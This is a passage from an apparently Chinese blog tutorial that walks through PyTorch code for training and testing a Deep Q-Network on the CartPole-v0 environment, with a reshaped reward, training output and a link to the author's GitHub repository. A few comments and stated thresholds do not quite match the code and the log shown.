&#x3D; np.zeros((MEMORY_CAPACITY, N_STATES * 2 + 2))             # 初始化记忆库，一行代表一个transition</span><br><span class="line">        self.optimizer &#x3D; torch.optim.Adam(self.eval_net.parameters(), lr&#x3D;LR)    # 使用Adam优化器 (输入为评估网络的参数和学习率)</span><br><span class="line">        self.loss_func &#x3D; nn.MSELoss()                                           # 使用均方损失函数 (loss(xi, yi)&#x3D;(xi-yi)^2)</span><br><span class="line"></span><br><span class="line">    def choose_action(self, x):                                                 # 定义动作选择函数 (x为状态)</span><br><span class="line">        x &#x3D; torch.unsqueeze(torch.FloatTensor(x), 0)                            # 将x转换成32-bit floating point形式，并在dim&#x3D;0增加维数为1的维度</span><br><span class="line">        if np.random.uniform() &lt; EPSILON:                                       # 生成一个在[0, 1)内的随机数，如果小于EPSILON，选择最优动作</span><br><span class="line">            actions_value &#x3D; self.eval_net.forward(x)                            # 通过对评估网络输入状态x，前向传播获得动作值</span><br><span class="line">            action &#x3D; torch.max(actions_value, 1)[1].data.numpy()                # 输出每一行最大值的索引，并转化为numpy ndarray形式</span><br><span class="line">            action &#x3D; action[0]                                                  # 输出action的第一个数</span><br><span class="line">        else:                                                                   # 随机选择动作</span><br><span class="line">            action &#x3D; np.random.randint(0, N_ACTIONS)                            # 这里action随机等于0或1 (N_ACTIONS &#x3D; 2)</span><br><span class="line">        return action                                                           # 返回选择的动作 (0或1)</span><br><span class="line"></span><br><span class="line">    def store_transition(self, s, a, r, s_):                                    # 定义记忆存储函数 (这里输入为一个transition)</span><br><span class="line">        transition &#x3D; np.hstack((s, [a, r], s_))                                 # 在水平方向上拼接数组</span><br><span class="line">        # 如果记忆库满了，便覆盖旧的数据</span><br><span class="line">        index &#x3D; self.memory_counter % MEMORY_CAPACITY                           # 获取transition要置入的行数</span><br><span class="line">        self.memory[index, :] &#x3D; transition                                      # 置入transition</span><br><span class="line">        self.memory_counter +&#x3D; 1                                                # memory_counter自加1</span><br><span class="line"></span><br><span class="line">    def learn(self):                                                            # 定义学习函数(记忆库已满后便开始学习)</span><br><span class="line">        # 目标网络参数更新</span><br><span class="line">        if self.learn_step_counter % TARGET_REPLACE_ITER &#x3D;&#x3D; 0:                  # 一开始触发，然后每100步触发</span><br><span class="line">            self.target_net.load_state_dict(self.eval_net.state_dict())         # 将评估网络的参数赋给目标网络</span><br><span class="line">        self.learn_step_counter +&#x3D; 1                                            # 学习步数自加1</span><br><span class="line"></span><br><span class="line">        # 抽取记忆库中的批数据</span><br><span class="line">        sample_index &#x3D; np.random.choice(MEMORY_CAPACITY, BATCH_SIZE)            # 在[0, 2000)内随机抽取32个数，可能会重复</span><br><span class="line">        b_memory &#x3D; self.memory[sample_index, :]                                 # 抽取32个索引对应的32个transition，存入b_memory</span><br><span class="line">        b_s &#x3D; torch.FloatTensor(b_memory[:, :N_STATES])                         # 将32个s抽出，转为32-bit floating point形式，并存储到b_s中，b_s为32行4列</span><br><span class="line">        b_a &#x3D; torch.LongTensor(b_memory[:, N_STATES:N_STATES+1].astype(int))    # 将32个a抽出，转为64-bit integer (signed)形式，并存储到b_a中 (之所以为LongTensor类型，是为了方便后面torch.gather的使用)，b_a为32行1列</span><br><span class="line">        b_r &#x3D; torch.FloatTensor(b_memory[:, N_STATES+1:N_STATES+2])             # 将32个r抽出，转为32-bit floating point形式，并存储到b_s中，b_r为32行1列</span><br><span class="line">        b_s_ &#x3D; torch.FloatTensor(b_memory[:, -N_STATES:])                       # 将32个s_抽出，转为32-bit floating point形式，并存储到b_s中，b_s_为32行4列</span><br><span class="line"></span><br><span class="line">        # 获取32个transition的评估值和目标值，并利用损失函数和优化器进行评估网络参数更新</span><br><span class="line">        q_eval &#x3D; self.eval_net(b_s).gather(1, b_a)                              # eval_net(b_s)通过评估网络输出32行每个b_s对应的一系列动作值，然后.gather(1, b_a)代表对每行对应索引b_a的Q值提取进行聚合</span><br><span class="line">        q_next &#x3D; self.target_net(b_s_).detach()                                 # q_next不进行反向传递误差，所以detach；q_next表示通过目标网络输出32行每个b_s_对应的一系列动作值</span><br><span class="line">        q_target &#x3D; b_r + GAMMA * q_next.max(1)[0].view(BATCH_SIZE, 1)           # q_next.max(1)[0]表示只返回每一行的最大值，不返回索引(长度为32的一维张量)；.view()表示把前面所得到的一维张量变成(BATCH_SIZE, 1)的形状；最终通过公式得到目标值</span><br><span class="line">        loss &#x3D; self.loss_func(q_eval, q_target)                                 # 输入32个评估值和32个目标值，使用均方损失函数</span><br><span class="line">        self.optimizer.zero_grad()                                              # 清空上一步的残余更新参数值</span><br><span class="line">        loss.backward()                                                         # 误差反向传播, 计算参数更新值</span><br><span class="line">        self.optimizer.step()                                                   # 更新评估网络的所有参数</span><br><span class="line"></span><br><span class="line">dqn &#x3D; DQN()                                                             # 令dqn&#x3D;DQN类</span><br><span class="line">score &#x3D; deque(maxlen&#x3D;50)</span><br><span class="line">for i in range(4000):                                                    # 400个episode循环</span><br><span class="line">    s &#x3D; env.reset()                                                     # 重置环境</span><br><span class="line">    episode_reward_sum &#x3D; 0                                              # 初始化该循环对应的episode的总奖励</span><br><span class="line">    while True:                                                         # 开始一个episode (每一个循环代表一步)</span><br><span class="line">        env.render()                                                    # 显示实验动画</span><br><span class="line">        a &#x3D; dqn.choose_action(s)                                        # 输入该步对应的状态s，选择动作</span><br><span class="line">        s_, r, done, info &#x3D; env.step(a)                                 # 执行动作，获得反馈</span><br><span class="line">        # 修改奖励 (不修改也可以，修改奖励只是为了更快地得到训练好的摆杆)</span><br><span class="line">        x, x_dot, theta, theta_dot &#x3D; s_</span><br><span class="line">        r1 &#x3D; (env.x_threshold - abs(x)) &#x2F; env.x_threshold - 0.8</span><br><span class="line">        r2 &#x3D; (env.theta_threshold_radians - abs(theta)) &#x2F; env.theta_threshold_radians - 0.5</span><br><span class="line">        new_r &#x3D; r1 + r2</span><br><span class="line">        dqn.store_transition(s, a, new_r, s_)                 # 存储样本</span><br><span class="line">        episode_reward_sum +&#x3D; new_r                           # 逐步加上一个episode内每个step的reward</span><br><span class="line">        s &#x3D; s_                                                # 更新状态</span><br><span class="line">        if dqn.memory_counter &gt; MEMORY_CAPACITY:              # 如果累计的transition数量超过了记忆库的固定容量2000，开始学习 (抽取记忆，即32个transition，并对评估网络参数进行更新，并在开始学习后每隔100次将评估网络的参数赋给目标网络)</span><br><span class="line">            dqn.learn()</span><br><span class="line">        if done:       # 如果done为True</span><br><span class="line">            score.append(episode_reward_sum)</span><br><span class="line">            print(f&#39;\r&#x3D;&#x3D;&gt; episode: &#123;i&#125;---reward_mean100: &#123;round(np.mean(score), 2)&#125;&#39;,end&#x3D;&quot;&quot;)</span><br><span class="line">            if i % 100 &#x3D;&#x3D; 0:</span><br><span class="line">                print(f&#39;\r&#x3D;&#x3D;&gt; episode: &#123;i&#125;---reward_mean100: &#123;round(np.mean(score), 2)&#125;&#39;)</span><br><span class="line">            break</span><br><span class="line">    if np.mean(score) &gt; 600 and i &gt; 500:</span><br><span class="line">        torch.save(dqn.eval_net,&#39;dqn_eval_v3.pth&#39;)</span><br><span class="line">        break</span><br><span class="line">print(&#39;------FINISHED------&#39;)</span><br></pre></td></tr></table></figure>
<p>训练过程中终端输出如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x3D;&#x3D;&gt; episode: 0---reward_mean100: 2.87</span><br><span class="line">&#x3D;&#x3D;&gt; episode: 100---reward_mean100: 2.47</span><br><span class="line">&#x3D;&#x3D;&gt; episode: 200---reward_mean100: 2.58</span><br><span class="line">&#x3D;&#x3D;&gt; episode: 300---reward_mean100: 350.95</span><br><span class="line">&#x3D;&#x3D;&gt; episode: 400---reward_mean100: 403.62</span><br><span class="line">&#x3D;&#x3D;&gt; episode: 500---reward_mean100: 524.56</span><br><span class="line">&#x3D;&#x3D;&gt; episode: 518---reward_mean100: 555.81</span><br><span class="line">------FINISHED------</span><br></pre></td></tr></table></figure>
<p>可以看出在reward_mean大于550时程序停止，同时得到dqn_eval_v3.pth文件，可用于测试训练的效果，测试代码如下所示：</p>
<p>test.py : （测试模型学习的效果）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import torch                                    # 导入torch</span><br><span class="line">import torch.nn as nn                           # 导入torch.nn</span><br><span class="line">import torch.nn.functional as F                 # 导入torch.nn.functional</span><br><span class="line">import numpy as np                              # 导入numpy</span><br><span class="line">import gym                                      # 导入gym</span><br><span class="line"></span><br><span class="line"># 超参数</span><br><span class="line">EPSILON &#x3D; 0.9                                   # greedy policy</span><br><span class="line">env &#x3D; gym.make(&#39;CartPole-v0&#39;).unwrapped         # 使用gym库中的环境：CartPole，且打开封装(若想了解该环境，请自行百度)</span><br><span class="line">N_ACTIONS &#x3D; env.action_space.n                  # 杆子动作个数 (2个)</span><br><span class="line">N_STATES &#x3D; env.observation_space.shape[0]       # 杆子状态个数 (4个)</span><br><span class="line"></span><br><span class="line"># 定义Net类 (定义网络)</span><br><span class="line">class Net(nn.Module):</span><br><span class="line">    def __init__(self):                                                         </span><br><span class="line">        # nn.Module的子类函数必须在构造函数中执行父类的构造函数</span><br><span class="line">        super(Net, self).__init__()                                            </span><br><span class="line"></span><br><span class="line">        self.fc1 &#x3D; nn.Linear(N_STATES, 50)                                      </span><br><span class="line">        self.fc1.weight.data.normal_(0, 0.1)</span><br><span class="line">        self.fc2 &#x3D; nn.Linear(50, 50)                                      </span><br><span class="line">        self.fc2.weight.data.normal_(0, 0.1)</span><br><span class="line">        self.out &#x3D; nn.Linear(50, N_ACTIONS)                                     </span><br><span class="line">        self.out.weight.data.normal_(0, 0.1)                                   </span><br><span class="line">    def forward(self, x):                                                       </span><br><span class="line">        x &#x3D; F.relu(self.fc1(x))                                                 </span><br><span class="line">        x &#x3D; F.relu(self.fc2(x))</span><br><span class="line">        return self.out(x)</span><br><span class="line"></span><br><span class="line"># 定义DQN类 (定义两个网络)</span><br><span class="line">class DQN(object):</span><br><span class="line">  def __init__(self):                                                         # 定义DQN的一系列属性</span><br><span class="line">    self.eval_net &#x3D; torch.load(&#39;.&#x2F;dqn_eval_v3.pth&#39;)</span><br><span class="line">    self.eval_net.eval()</span><br><span class="line"></span><br><span class="line">  def choose_action(self, x):                                                 # 定义动作选择函数 (x为状态)</span><br><span class="line">    x &#x3D; torch.unsqueeze(torch.FloatTensor(x), 0)                            # 将x转换成32-bit floating point形式，并在dim&#x3D;0增加维数为1的维度</span><br><span class="line">    if np.random.uniform() &lt; EPSILON:                                       # 生成一个在[0, 1)内的随机数，如果小于EPSILON，选择最优动作</span><br><span class="line">      actions_value &#x3D; self.eval_net.forward(x)                            # 通过对评估网络输入状态x，前向传播获得动作值</span><br><span class="line">      action &#x3D; torch.max(actions_value, 1)[1].data.numpy()                # 输出每一行最大值的索引，并转化为numpy ndarray形式</span><br><span class="line">      action &#x3D; action[0]                                                  # 输出action的第一个数</span><br><span class="line">    else:                                                                   # 随机选择动作</span><br><span class="line">      action &#x3D; np.random.randint(0, N_ACTIONS)                            # 这里action随机等于0或1 (N_ACTIONS &#x3D; 2)</span><br><span class="line">    return action                                                           # 返回选择的动作 (0或1)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">dqn &#x3D; DQN()                                                             # 令dqn&#x3D;DQN类</span><br><span class="line">while True:</span><br><span class="line">  s &#x3D; env.reset()                                                     # 重置环境</span><br><span class="line">  episode_reward_sum &#x3D; 0                                              # 初始化该循环对应的episode的总奖励</span><br><span class="line">  while True:                                                         # 开始一个episode (每一个循环代表一步)</span><br><span class="line">    env.render()                                                    # 显示实验动画</span><br><span class="line">    a &#x3D; dqn.choose_action(s)                                        # 输入该步对应的状态s，选择动作</span><br><span class="line">    s_, r, done, info &#x3D; env.step(a)                                 # 执行动作，获得反馈</span><br><span class="line">    x, x_dot, theta, theta_dot &#x3D; s_</span><br><span class="line">    r1 &#x3D; (env.x_threshold - abs(x)) &#x2F; env.x_threshold - 0.8</span><br><span class="line">    r2 &#x3D; (env.theta_threshold_radians - abs(theta)) &#x2F; env.theta_threshold_radians - 0.5</span><br><span class="line">    new_r &#x3D; r1 + r2</span><br><span class="line">    episode_reward_sum +&#x3D; new_r                           </span><br><span class="line">    s &#x3D; s_                                                </span><br><span class="line">    if done:</span><br><span class="line">      print(f&#39;reward_sum:&#123;round(episode_reward_sum, 2)&#125;&#39;)</span><br><span class="line">      break</span><br></pre></td></tr></table></figure>
<p>动画效果如下，测试的获得奖励情况在终端中有显示，如下:</p>
<p><img src="https://cdn.jsdelivr.net/gh/wxt406611016/cdn@master/vedio/20211208-204030.gif" alt="image"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">reward_sum:237.14</span><br></pre></td></tr></table></figure>
<p>jupyter代码在github上可以获取，<a href="https://github.com/wxt406611016/DQN-CartPole-v0">点击传送至Github</a></p>
]]></content>
      <categories>
        <category>RL</category>
      </categories>
      <tags>
        <tag>Machine Learning</tag>
      </tags>
  </entry>
</search>
